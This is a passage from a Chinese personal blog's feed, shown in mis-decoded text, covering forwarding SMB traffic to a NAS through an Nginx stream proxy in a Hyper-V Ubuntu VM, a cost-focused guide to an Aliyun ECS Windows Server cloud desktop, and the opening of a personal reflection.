·æœ‰æ•ˆã€‚</p><p>æ‰€ä»¥ï¼Œåªè¦åœ¨è™šæ‹Ÿæœºé‡Œé¢è£…ä¸€ä¸ªåå‘ä»£ç†åº”ç”¨ï¼ˆNginxï¼‰ï¼ŒæŠŠå‘å¾€è™šæ‹Ÿæœº 445 ç«¯å£çš„æµé‡è½¬å‘åˆ° Samba æœåŠ¡å™¨ï¼Œç„¶åä½¿ç”¨ Windows Samba å®¢æˆ·ç«¯è®¿é—®è¿™ä¸ªè™šæ‹Ÿæœºï¼Œå°±ç­‰äºè®¿é—® Samba æœåŠ¡å™¨ã€‚</p><h2 id="å®è·µ"><a href="#å®è·µ" class="headerlink" title="å®è·µ"></a>å®è·µ</h2><p>è¿™é‡Œï¼Œæˆ‘ä½¿ç”¨äº† Windows Hyper Vï¼Œåˆ›å»ºäº† Ubuntu 20.04 Server è™šæ‹Ÿæœºï¼ˆç›´æ¥ä¸‹è½½å®˜æ–¹ ISOï¼‰ï¼Œç„¶åä½¿ç”¨é»˜è®¤äº¤æ¢æœºä½œä¸ºè™šæ‹Ÿæœºçš„ç½‘ç»œã€‚</p><p><img src="https://img.vvzero.com/ih/2020/04/28/2416a9e0b66ec.png" alt="Snipaste_2020-04-28_14-07-57.png" style="zoom:33%;"></p><p>å¯åŠ¨åï¼Œå®‰è£…ç³»ç»Ÿï¼Œç„¶åé™¤äº†æ›´æ–°é•œåƒæºã€å®‰è£… Nginxï¼Œä»€ä¹ˆéƒ½ä¸ç”¨åšã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><p>è£…å¥½ Nginx åï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>æ·»åŠ ä¸€ä¸ª stream æ¨¡å—ï¼Œå¤§è‡´åƒä¸‹é¢ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">445</span>;</span><br><span class="line">        </span><br><span class="line">        // ä½ çš„ NAS åœ°å€</span><br><span class="line">        <span class="attribute">proxy_pass</span> mynas.example.com:<span class="number">12345</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé‡å¯ Nginxï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><p>è½¬å‘çš„æ¨¡å—å°±åšå¥½äº†ã€‚</p><p>ç„¶åï¼Œå†åœ¨ Windows ä¸­æ‰“å¼€ <code>\\&lt;è™šæ‹Ÿæœºçš„ip&gt;\&lt;samba è·¯å¾„ï¼ˆå¯é€‰ï¼‰&gt;</code> å°±å®Œæˆäº†ã€‚è™šæ‹Ÿæœº ip å¯ä»¥åœ¨è™šæ‹Ÿæœºé‡Œé¢ç”¨ ifconfig å‘½ä»¤æŸ¥çœ‹ã€‚</p><h2 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h2><p>ä¹Ÿè®¸å¯ä»¥ç”¨ docker å®ç°ï¼Œä½†æˆ‘è¿˜æ²¡æƒ³å¥½æ€ä¹ˆæã€‚</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/</id>
        <title><![CDATA[ä½¿ç”¨é˜¿é‡Œäº‘ ECS æ­å»ºå»‰ä»·çš„é«˜æ€§èƒ½äº‘æ¡Œé¢]]></title>
        <updated>2020-04-28T05:26:07+08:00</updated>
        <link href="https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/"><![CDATA[<blockquote><p>è¦æƒ³è¯»æ‡‚æœ¬æ–‡ï¼Œä½ éœ€è¦ï¼š</p><ol><li>äº†è§£é˜¿é‡Œäº‘ç­‰äº‘æœåŠ¡çš„åŸºæœ¬ WEB ç•Œé¢æ“ä½œï¼›</li><li>äº†è§£ Windows æ“ä½œç³»ç»Ÿçš„ä¸­é˜¶æ“ä½œï¼›</li><li>äº†è§£åŸºç¡€çš„è½¯ä»¶å¼€å‘æœ¯è¯­ã€‚</li></ol></blockquote><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡é¢å‘çš„æ˜¯éœ€è¦ä½¿ç”¨é«˜æ€§èƒ½è®¡ç®—è®¾å¤‡ï¼Œä½†æ˜¯èº«è¾¹åªæœ‰ä½æ€§èƒ½PCæœºçš„ç¾¤ä½“ã€‚æœ€è¿‘ç”±äº NCP ç–«æƒ…ï¼Œå‡ºä¸äº†é—¨ï¼Œè¿”å›ä¸äº†å·¥ä½œåœ°ï¼Œæƒ³å¿…ä¸å°‘äººçš„é«˜æ€§èƒ½è®¡ç®—è®¾å¤‡ï¼ˆå¥½ç”µè„‘ï¼‰æ²¡å¸¦å›å®¶ï¼Œä½†æ˜¯ï¼Œè‚¯å®šä¹Ÿæœ‰äººè·Ÿæˆ‘ä¸€æ ·ï¼Œå—ä¸äº†ç¬”è®°æœ¬ç”µè„‘çš„é¾Ÿé€Ÿã€‚</p><p>æˆ‘çš„é…ç½®éœ€æ±‚æ˜¯ï¼Œèƒ½å¤Ÿæµç•…è¿è¡Œå®‰è£…å¤šä¸ªæ’ä»¶çš„ VSCodeã€èƒ½å¤ŸåŒæ—¶æ‰“å¼€æ•°åä¸ª Firefox æ ‡ç­¾é¡µã€èƒ½å¤Ÿå¿«é€Ÿå®Œæˆ node é¡¹ç›®æ„å»ºã€‚ä½†æ˜¯æˆ‘èº«è¾¹åªæœ‰ä¸€å°äº”å¹´å‰çš„ intel NUC (i3-4010U, 4GB RAM)ã€‚</p><p>åœ¨è¯¦ç»†äº†è§£äº†å„å¤§äº‘æœåŠ¡å•†çš„äº‘è®¡ç®—å¹³å°åï¼Œä¸ªäººæ’é™¤äº†åä¸ºäº‘ï¼ˆå¼¹æ€§è®¡ç®—æœåŠ¡ä»·æ ¼è¾ƒé«˜ã€äº‘æ¡Œé¢å”®ç½„ï¼‰ã€è…¾è®¯äº‘ï¼ˆäº‘è®¡ç®—æœåŠ¡ç±»åˆ«è¿‡å°‘ï¼‰ã€å¤©ç¿¼äº‘ï¼ˆäº‘æ¡Œé¢éœ€è¦å®‰è£…æŒ‡å®š APP ä¸”æ€§èƒ½ä¸æ»¡è¶³è¦æ±‚ï¼‰ï¼Œå†³å®šä½¿ç”¨é˜¿é‡Œäº‘çš„äº‘è®¡ç®—æœåŠ¡ã€‚</p><h2 id="ä½¿ç”¨é˜¿é‡Œäº‘åˆæ­¥æ­å»ºäº‘æ¡Œé¢"><a href="#ä½¿ç”¨é˜¿é‡Œäº‘åˆæ­¥æ­å»ºäº‘æ¡Œé¢" class="headerlink" title="ä½¿ç”¨é˜¿é‡Œäº‘åˆæ­¥æ­å»ºäº‘æ¡Œé¢"></a>ä½¿ç”¨é˜¿é‡Œäº‘åˆæ­¥æ­å»ºäº‘æ¡Œé¢</h2><p>ç»è¿‡æƒè¡¡ï¼Œæˆ‘å†³å®šä½¿ç”¨é˜¿é‡Œäº‘ ESC â€œæŠ¢å å¼å®ä¾‹â€ä»˜è´¹æ¨¡å¼ä¸‹çš„â€œçªå‘æ€§èƒ½å®ä¾‹â€ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆé€‰ï¼Ÿ</p><p>å› ä¸ºæ²¡é’±â€¦â€¦</p><p>å¼€ç©ç¬‘çš„ã€‚æˆ‘è§‰å¾—è¿™æ˜¯æˆ‘éœ€æ±‚ä¸‹çš„åˆç†é€‰æ‹©æ–¹å¼ã€‚ä¸ºä»€ä¹ˆé€‰æ‹©â€œæŠ¢å å¼å®ä¾‹â€ï¼Ÿé¦–å…ˆï¼Œæˆ‘ä»¬å¤å·¥çš„æ—¶é—´è¿˜æ˜¯ä¸ªæœªçŸ¥æ•°ï¼Œè€Œä¸”å¯èƒ½éšæ—¶å°±ä¸æƒ³ç”¨è¿™ä¸ªäº‘æ¡Œé¢äº†ã€‚â€œæŠ¢å å¼å®ä¾‹â€æ˜¯æŒ‰é‡ä»˜è´¹çš„ä¸€ç§ï¼Œä¹Ÿå°±æ˜¯ï¼Œç”¨å¤šé•¿æ—¶é—´ç»™å¤šå°‘é’±ã€‚å¹¶ä¸”ï¼Œç›¸å¯¹äºæŒ‰é‡ä»˜è´¹ï¼Œæœ‰ç›¸å½“å¤§çš„æŠ˜æ‰£ã€‚<strong>â€œæŠ¢å å¼å®ä¾‹â€çš„æœ€å¤§é—®é¢˜åœ¨äºï¼Œè¿™æ˜¯ç«ä»·æ¨¡å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“åˆ«äººå‡ºä»·æ¯”ä½ é«˜çš„æ—¶å€™ï¼Œæˆ–è€…é˜¿é‡Œäº‘ä¾›ç»™ç´§å¼ è€Œä½ åˆç»™é’±ç»™å¾—ä¸å¤Ÿçš„æ—¶å€™ï¼Œå®ƒä¼šè‡ªåŠ¨å¸®ä½ é‡Šæ”¾ã€‚æˆ‘äº†è§£çš„æ˜¯ï¼Œåœ¨é‡Šæ”¾å‰5åˆ†é’Ÿï¼Œé˜¿é‡Œäº‘ä¼šæœ‰æé†’ã€‚</strong>ä¸ºäº†å°½é‡é¿å…å®ä¾‹è¢«è‡ªåŠ¨é‡Šæ”¾ï¼Œæˆ‘é€‰æ‹©äº†â€œä½¿ç”¨è‡ªåŠ¨å‡ºä»·â€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç³»ç»Ÿä¼šæ¯å°æ—¶è‡ªåŠ¨åˆ¤æ–­å½“å‰æ—¶é—´è¯¥å®ä¾‹çš„ä»·æ ¼ï¼Œå¹¶é€‰æ‹©ä¸€ä¸ªé«˜äºå¸‚åœºå‡ä»·çš„ä»·æ ¼è¿›è¡Œä»˜è´¹ã€‚<strong>ä½†æ˜¯ï¼Œè¿™å¹¶ä¸æ˜¯ä¸‡æ— ä¸€å¤±ï¼Œé˜¿é‡Œäº‘åœ¨ä¾›ç»™ç´§å¼ çš„æ—¶å€™ï¼Œä»ç„¶ä¼šå°†å®ä¾‹é‡Šæ”¾ã€‚</strong>æ‰€ä»¥ï¼Œåœ¨å¤„ç†é‡è¦æ•°æ®æ—¶ï¼Œåº”è¯¥éšæ—¶å¤‡ä»½ã€‚æˆ‘çš„å¤„ç†æ–¹æ³•æ˜¯ï¼Œéšæ—¶å°†ä»£ç æäº¤åˆ°æˆ‘çš„ Git ä»“åº“ã€‚</p><p><img src="https://img.vvzero.com/ih/2020/02/09/ea3d50f39b198.png" alt="Snipaste_2020-02-09_17-32-20.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/df1fabf212984.png" alt="Snipaste_2020-02-09_17-34-24.png"></p><p>å¦‚æœè¦ä¿è¯ä¸ä¼šè¢«é‡Šæ”¾ï¼Œå»ºè®®ä½¿ç”¨åŒ…å¹´åŒ…æœˆåˆ¶ã€‚</p><p>ä¸ºä»€ä¹ˆä½¿ç”¨â€œçªå‘æ€§èƒ½å®ä¾‹â€ï¼Ÿå› ä¸ºä¸ªäººç”µè„‘ä¸æœåŠ¡å™¨ä¸åŒã€‚ä¸ªäººç”µè„‘ä¸ä¼šæ—¶æ—¶åˆ»åˆ»å ç”¨å¤§é‡ CPUï¼ŒCPUä½¿ç”¨ç‡æ˜¯ç¦»æ•£åŒ–çš„ï¼Œæ‰€ä»¥ CPU çš„ä½¿ç”¨ç§¯åˆ†ï¼Œæˆ‘è§‰å¾—æ˜¯ç”¨ä¸å®Œï¼Œ25% çš„ä½¿ç”¨åŸºçº¿ï¼Œå®Œå…¨å¤Ÿç”¨ã€‚</p><p><img src="https://img.vvzero.com/ih/2020/02/09/d74c0622ec620.png" alt="Snipaste_2020-02-09_17-34-05.png"></p><p>å“ï¼Œç›®å‰å¥½åƒå›½å†…ä¹Ÿåªæœ‰é˜¿é‡Œäº‘èƒ½åšå‡ºâ€œæŠ¢å å¼å®ä¾‹â€å’Œâ€œçªå‘æ€§èƒ½å®ä¾‹â€ã€‚</p><p>å…¶ä»–çš„é…ç½®å°±ç®€å•äº†ï¼ŒåŒºåŸŸé€‰æ‹©é è¿‘ä½ çš„ï¼ˆä¸åŒåœ°åŒºçš„ä»·æ ¼å¥½åƒå·®åˆ«æŒºå¤§ï¼‰ï¼Œé•œåƒé€‰æ‹© Windows Serverï¼Œå¦å¤–ï¼ŒSSD æ˜¯å¾ˆå…³é”®çš„ï¼Œæˆ‘è§‰å¾—ç°åœ¨å·²ç»æ²¡æœ‰å¤šå°‘äººèƒ½å¿å—æœºæ¢°ç¡¬ç›˜çš„é¾Ÿé€Ÿäº†ã€‚</p><p><img src="https://img.vvzero.com/ih/2020/02/09/6ae75caa75c6a.png" alt="Snipaste_2020-02-09_18-03-26.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/cbe75edc3c797.png" alt="Snipaste_2020-02-09_17-36-25.png"></p><p>åœ¨ä¸‹ä¸€ä¸ªé¡µé¢é…ç½®ç½‘ç»œï¼Œä¸ºäº†ä¿è¯è¿œç¨‹æ¡Œé¢æµç•…ï¼ŒæŒ‰ä½¿ç”¨æµé‡è®¡è´¹ï¼Œå¸¦å®½æ‹‰æ»¡ï¼</p><p><img src="https://img.vvzero.com/ih/2020/02/09/2c112190ea447.png" alt="Snipaste_2020-02-09_17-45-57.png"></p><p>æœ€ç»ˆï¼Œæˆ‘çš„é…ç½®å¦‚ä¸‹ï¼š</p><ul><li>4æ ¸16GBï¼Œ25% å¹³å‡CPU è®¡ç®—æ€§èƒ½ï¼›</li><li>100Mbps æŒ‰æµé‡ä»˜è´¹ç½‘ç»œï¼›</li><li>80GB SSDï¼›</li><li>Windows Server 2019 æ•°æ®ä¸­å¿ƒç‰ˆï¼›</li></ul><p>è¿™æ ·çš„è¯ï¼Œå®ä¾‹ä»·æ ¼ä¸º 0.412 å…ƒæ¯å°æ—¶ï¼ˆæˆ‘é€‰çš„æ˜¯ä¸Šæµ·åŒºçš„ï¼Œå…¶ä»–åŒºçš„å¯èƒ½æ›´ä¾¿å®œï¼Œåœ¨æ·±å¤œã€æ—©ä¸Šä¹Ÿä¼šæ›´ä¾¿å®œï¼‰ï¼Œæµé‡è´¹ç”¨ä¸º 0.8 å…ƒæ¯ GBã€‚ç®—ä¸€ç®—ï¼Œä¸€å¤©å¤§æ¦‚è¦ 10 å…ƒï¼Œä¸€ä¸ªæœˆå¤§æ¦‚è¦ 300 å…ƒï¼Œæ˜¯ä¸æ˜¯è¿˜æ˜¯æœ‰ç‚¹è´µï¼Ÿæ²¡å…³ç³»ï¼Œç»§ç»­çœ‹ã€‚</p><p><img src="https://img.vvzero.com/ih/2020/02/09/ecfef72872df3.png" alt="Snipaste_2020-02-09_17-36-50.png"></p><h2 id="ä»·æ ¼çš„è¿›ä¸€æ­¥ä¼˜åŒ–"><a href="#ä»·æ ¼çš„è¿›ä¸€æ­¥ä¼˜åŒ–" class="headerlink" title="ä»·æ ¼çš„è¿›ä¸€æ­¥ä¼˜åŒ–"></a>ä»·æ ¼çš„è¿›ä¸€æ­¥ä¼˜åŒ–</h2><p>ç°åœ¨æˆ‘å·²ç»å¯åŠ¨äº†è¿™ä¸ªå®ä¾‹ï¼š</p><p><img src="https://img.vvzero.com/ih/2020/02/09/3ea24c1929367.png" alt="Snipaste_2020-02-09_18-21-04.png"></p><p>æˆ‘è¿˜æƒ³æ›´ä¾¿å®œã€‚</p><h3 id="ä¸åŸºå‹åˆç§Ÿä¸€å°æœºå™¨"><a href="#ä¸åŸºå‹åˆç§Ÿä¸€å°æœºå™¨" class="headerlink" title="ä¸åŸºå‹åˆç§Ÿä¸€å°æœºå™¨"></a>ä¸åŸºå‹åˆç§Ÿä¸€å°æœºå™¨</h3><p>æˆ‘æƒ³ä½ ä¸€å®šä¸å¯èƒ½ä¸€å¤©24å°æ—¶éƒ½åœ¨ç”¨å®ƒï¼Œç”¨å®ƒçš„æ—¶å€™ä¹Ÿä¸€å®šä¸ä¼šä¸€ç›´å æ»¡ CPUã€‚å…³é”®æ˜¯ï¼Œæˆ‘ä»¬è¿™æ˜¯ Windows Serverï¼Œè·Ÿå®¶åº­ç‰ˆã€ä¸“ä¸šç‰ˆã€ä¼ä¸šç‰ˆä»€ä¹ˆçš„éƒ½ä¸ä¸€æ ·ï¼Œå®ƒæ”¯æŒå¤šä¸ªç”¨æˆ·åŒæ—¶ç™»é™†ï¼æ‰€ä»¥ï¼Œæˆ‘è§‰å¾—ï¼Œå¦‚æœæœ‰ä¿¡ä»»çš„äººé€‰ï¼Œå®Œå…¨å¯ä»¥åˆç§Ÿã€‚</p><h3 id="å…³æœºæ—¶é€‰æ‹©â€œåœæœºä¸è®¡è´¹â€"><a href="#å…³æœºæ—¶é€‰æ‹©â€œåœæœºä¸è®¡è´¹â€" class="headerlink" title="å…³æœºæ—¶é€‰æ‹©â€œåœæœºä¸è®¡è´¹â€"></a>å…³æœºæ—¶é€‰æ‹©â€œåœæœºä¸è®¡è´¹â€</h3><p>é˜¿é‡Œäº‘çœŸçš„æ˜¯ç¥å¥‡çš„å­˜åœ¨ï¼Œåœ¨ ECS ç®¡ç†ç•Œé¢ï¼Œé€‰æ‹©åœæœºï¼Œç«Ÿç„¶å¯ä»¥åœæœºä¸æ”¶è´¹ï¼</p><p><img src="https://img.vvzero.com/ih/2020/02/09/28437c5fae934.png" alt="å›¾ç‰‡1.png"></p><p>å®é™…ä¸Šä¹Ÿä¸æ˜¯å®Œå…¨ä¸æ”¶è´¹ï¼Œç¡¬ç›˜å’Œå¼¹æ€§å…¬ç½‘ IP ä»ç„¶æ˜¯æ”¶è´¹çš„ã€‚ä½†æ˜¯ï¼Œä¸åœæœºåä»ç„¶ä¿ç•™CPUã€å†…å­˜ç›¸æ¯”ï¼Œä»·æ ¼å¤§å¹…é™ä½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨æ¯å¤©æ™šä¸Šï¼Œå®Œå…¨å¯ä»¥å…³æœºå¹¶é€‰æ‹©ä¸æ”¶è´¹ï¼Œå¯ä»¥èŠ‚çº¦ä¸€å¤§ç¬”ã€‚å¦‚æœæƒ³è¦ä¸€ç›´ä½¿ç”¨åŒä¸€ä¸ª IPï¼Œå¯ä»¥é€‰æ‹©ç»‘å®šå¼¹æ€§å…¬ç½‘ IPã€‚</p><h3 id="ä¾æ®ä¸ªäººéœ€æ±‚é€‰æ‹©å®ä¾‹è§„æ ¼"><a href="#ä¾æ®ä¸ªäººéœ€æ±‚é€‰æ‹©å®ä¾‹è§„æ ¼" class="headerlink" title="ä¾æ®ä¸ªäººéœ€æ±‚é€‰æ‹©å®ä¾‹è§„æ ¼"></a>ä¾æ®ä¸ªäººéœ€æ±‚é€‰æ‹©å®ä¾‹è§„æ ¼</h3><p>æˆ‘è§‰å¾—ï¼Œå¯èƒ½ 8GB å†…å­˜å·²ç»å¤Ÿæˆ‘ç”¨äº†ï¼Œå¦å¤–ï¼Œé’å²›åŒºçš„å®ä¾‹å¥½åƒæ¯å°æ—¶èƒ½æ›´ä¾¿å®œä¸€æ¯›é’±â€¦â€¦</p><h2 id="äº‘æ¡Œé¢ä½“éªŒ"><a href="#äº‘æ¡Œé¢ä½“éªŒ" class="headerlink" title="äº‘æ¡Œé¢ä½“éªŒ"></a>äº‘æ¡Œé¢ä½“éªŒ</h2><p>åœ¨ä½“éªŒä¹‹å‰ï¼Œå†ç¡®ä¿ä¸€ä¸‹ï¼šè¯¥å®ä¾‹ç½‘ç»œå®‰å…¨ç»„ï¼Œéœ€è¦æ”¾é€š 3389 ç«¯å£ï¼ˆTCP å’Œ UDP éƒ½è¦æ”¾é€šï¼‰ã€‚</p><p>æ‰“å¼€æœ¬åœ°çš„è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯è¯•è¯•å§ï¼</p><p><img src="https://img.vvzero.com/ih/2020/02/09/b4629c62b4373.png" alt="Snipaste_2020-02-09_18-38-25.png"></p><p>ç½‘ç»œæ–¹é¢ï¼Œæˆ‘æ˜¯æ±Ÿè‹ç”µä¿¡ç½‘ç»œï¼Œè¿æ¥ä¸Šæµ·åŒºçš„ ECSï¼Œå»¶è¿Ÿå¾ˆå°ï¼Œå¯ä»¥å¿½ç•¥ï¼Œè€Œä¸”ç”»è´¨å¾ˆæ¸…æ™°ï¼Œæš‚æ—¶æ²¡æœ‰ä»€ä¹ˆç”»é¢å¡é¡¿ã€‚è‡³äºä¸‹è¡Œç½‘ç»œï¼Œç”±äºè¿™æ˜¯é˜¿é‡Œäº‘çš„ä¸“çº¿ï¼Œæ¯”å®¶ç”¨è¿è¥å•†ç½‘ç»œå¥½å¤ªå¤šï¼Œä¸‹è½½é€Ÿåº¦å—–å—–çš„ï¼Œä¸ç®¡å›½å†…å¤–ã€‚</p><p>è®¡ç®—æ€§èƒ½æ–¹é¢ï¼Œåœ¨æˆ‘æœ¬åœ°æœºå™¨ä¸Šï¼ŒVSCode çš„ Python æ’ä»¶ï¼Œè¿›è¡Œä¸€æ¬¡æ–‡ä»¶é”™è¯¯æ‰«æéœ€è¦ 5 ç§’å·¦å³ï¼Œè€Œè¿™å°äº‘æ¡Œé¢ï¼Œåªè¦ 1 ç§’ã€‚</p><p>æ“ä½œç³»ç»Ÿæ–¹é¢ï¼ŒWindows Server æ¯” Windows PC ç®€æ´å¾ˆå¤šï¼Œæ²¡æœ‰ä¹±ä¸ƒå…«ç³Ÿçš„æœåŠ¡ï¼Œä½†ä¹Ÿæ²¡æœ‰ç¼ºå°‘æ—¥å¸¸å¼€å‘æ‰€éœ€çš„é‡è¦ç»„ä»¶ã€‚å¯èƒ½ä¼šæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œä½†æ˜¯å¦‚æœå‡ºé—®é¢˜ï¼Œä¸€èˆ¬èƒ½å¾ˆå¿«è§£å†³ã€‚æ¯”å¦‚æˆ‘åœ¨å®‰è£… Python æ—¶å‡ºé”™ï¼ŒGoogle ä¸€ä¸‹ä¾¿çŸ¥è¦ç›´æ¥ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€ã€‚</p><p>ä»¥ä¸‹æˆªå›¾è‡ªæˆ‘çš„äº‘æ¡Œé¢ã€‚</p><p><img src="https://img.vvzero.com/ih/2020/02/09/d3b52ba297968.png" alt="Screenshot _1_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/e9ae18b879037.png" alt="Screenshot _3_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/9f2c0741b0057.png" alt="Screenshot _4_.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/8109324fabb58.png" alt="Screenshot _2_.png"></p><h3 id="æé«˜ä½“éªŒçš„å¯é€‰é¡¹"><a href="#æé«˜ä½“éªŒçš„å¯é€‰é¡¹" class="headerlink" title="æé«˜ä½“éªŒçš„å¯é€‰é¡¹"></a>æé«˜ä½“éªŒçš„å¯é€‰é¡¹</h3><ol><li>å…³é—­ Windows çš„è¿‡æ¸¡åŠ¨ç”»ï¼Œè¿™åœ¨è¿œç¨‹æ¡Œé¢ä¸Šä¼šå¯¼è‡´å¡é¡¿ï¼Œä¸”ä¼šæ¶ˆè€—å¤§é‡çš„æµé‡è´¹ï¼›</li><li>å®‰å…¨èµ·è§ï¼Œé‡æ–°åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·å¹¶ç¦ç”¨ Administrator ç”¨æˆ·ï¼›</li><li>ç”¨å¥½å„ç§äº‘åŒæ­¥åŠŸèƒ½ï¼Œæ¯”å¦‚ Git ä»“åº“ã€æµè§ˆå™¨äº‘åŒæ­¥ã€äº‘ç›˜ç­‰ã€‚</li></ol><h2 id="å®æµ‹ä»·æ ¼"><a href="#å®æµ‹ä»·æ ¼" class="headerlink" title="å®æµ‹ä»·æ ¼"></a>å®æµ‹ä»·æ ¼</h2><p>æˆ‘æ­£å¸¸ä½¿ç”¨äº†ä¸€å¤©ï¼Œæ™šä¸Šåœæœºä¸æ”¶è´¹ï¼Œæ¶ˆè´¹å¦‚ä¸‹ï¼š</p><p><img src="https://img.vvzero.com/ih/2020/02/09/176c67e7015fa.png" alt="Snipaste_2020-02-09_18-54-30.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/140f26bd1d962.png" alt="Snipaste_2020-02-09_18-55-07.png"></p><p>å¯è§ï¼Œæˆ‘ä¸€å¤©å¤§è‡´æ¶ˆè´¹5å…ƒã€‚</p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ç¡®å®ä¸æ˜¯å¾ˆè´µï¼Œå¯è¡Œæ€§ä¹Ÿå¾ˆé«˜ã€‚å‡å¦‚æœ‰æ¨¡å‹æ¸²æŸ“éœ€æ±‚ï¼Œç”šè‡³å¯ä»¥ç»‘å®šä¸ªæ˜¾å¡ï¼ˆ</p><p>æŠ¢å å¼å®ä¾‹ä¹Ÿä¸æ˜¯å¾ˆå¯æ€•å§ï¼Ÿæˆ‘çš„å®ä¾‹ç›®å‰æ²¡è¢«å›æ”¶ã€‚</p><p>å¦å¤–ï¼Œæœ‰äººæƒ³è·Ÿæˆ‘åˆç§Ÿå—ï¼Ÿ</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/05/23/thinking-in-20190523/</id>
        <title><![CDATA[20190523 éšæƒ³]]></title>
        <updated>2020-04-28T05:26:07+08:00</updated>
        <link href="https://blog.vvzero.com/2019/05/23/thinking-in-20190523/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/05/23/thinking-in-20190523/"><![CDATA[<p>å››å¹´ä¹‹å‰ï¼Œæˆ‘é«˜äºŒçš„æ—¶å€™ï¼Œä¸€å¤©å‚æ™šæ”¾å­¦ï¼Œæˆ‘è·Ÿå½“æ—¶æ•™æˆ‘åŒ–å­¦çš„6è€å¸ˆï¼ˆä»£ç§°ï¼‰ï¼Œå¼€ç©ç¬‘å¼åœ°èµ·äº†äº‰æ‰§ã€‚6è€å¸ˆäººå¾ˆå¥½ï¼Œæˆ‘ä»¬éƒ½è·Ÿä»–ç§°å…„é“å¼Ÿçš„ã€‚èµ·å› æ˜¯ï¼Œ6è€å¸ˆå‘æˆ‘ä»¬ç§€ä»–æ–°ä¹°çš„çƒé‹ï¼Œå¾ˆé…·ï¼Œæ˜¯æŸä¸ªæ—¥æœ¬åç‰Œã€‚å½“æ—¶çš„æˆ‘ç¬‘é“ï¼šâ€œæ—¥è´§å•Šï¼Œä¸èƒ½ç©¿å•Šï¼â€ï¼ˆå½“æ—¶çš„å­¦ç”Ÿä¸­é—´ï¼Œè¿™æ ·çš„æ€æƒ³æ°›å›´è¿˜æ¯”è¾ƒæµ“ï¼‰ã€‚</p><p>6è€å¸ˆç«‹åˆ»å°±åé©³äº†ï¼šâ€œä¸ºä»€ä¹ˆä¸èƒ½ç©¿ï¼Ÿâ€â€œä¸œè¥¿å¥½ç”¨ï¼Œä¸ºä»€ä¹ˆä¸ä¹°ï¼Ÿâ€å½“æ—¶æˆ‘è¿˜æœ‰ä¸€äº›ç°åœ¨çœ‹æ¥å¯ç¬‘çš„è¯ï¼Œéƒ½è¢«6è€å¸ˆâ€œè®½åˆºâ€äº†ä¸€ç•ªã€‚æˆ‘ä»ä¸æœæ°”ï¼Œè¦äº‰è¾©ï¼Œ6è€å¸ˆå¯¹æˆ‘è¯´ï¼šâ€œå¾ˆå¤šä½ çœ‹åˆ°çš„äº‹æƒ…ï¼Œå¹¶ä¸ä¸€å®šæ˜¯çœŸçš„â€¦â€¦æ˜¯è¢«ä¿®é¥°è¿‡çš„â€¦â€¦â€</p><p>æˆ‘å¤§è‡´å¬æ‡‚äº†ä»–çš„æ„æ€ï¼Œä½†è¿›ä¸€æ­¥é—®ï¼šâ€œæ—¢ç„¶å„ç§å†å²ã€äº‹æƒ…éƒ½ä¼šè¢«ä¿®é¥°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆæ‰èƒ½çŸ¥æ™“çœŸå®çš„æƒ…å†µå‘¢ï¼Ÿæ¯•ç«Ÿï¼Œä¸ç®¡å“ªä¸€æ–¹è¯´å‡ºçš„è¯ï¼Œéƒ½æœ‰å¯èƒ½å› 